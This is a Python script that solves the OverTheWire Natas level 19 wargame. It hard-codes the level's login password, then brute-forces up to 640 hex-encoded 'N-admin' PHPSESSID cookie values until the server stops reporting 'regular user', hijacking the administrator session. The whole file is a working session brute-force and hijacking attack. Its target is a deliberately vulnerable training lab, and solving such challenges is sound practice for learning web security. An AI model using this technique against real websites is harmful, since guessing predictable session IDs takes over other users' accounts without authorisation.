import requests

url = "http://natas19.natas.labs.overthewire.org/"

auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

print("Start Attacking ....")

def hex2ascii(s):
    ret = ""
    for c in s:
        coded = hex(ord(c))
        ret += coded[2:]
    return ret

for i in range(640):
    cookies = {"PHPSESSID" : hex2ascii(f"{i}-admin")}
    res = requests.get(url, auth=auth, cookies=cookies)
    print(hex2ascii(f'{i}-admin'))
    if "regular user" not in res.text:
        print("CRACKED ! --> ",{hex2ascii(f"{i}-admin")})
        break
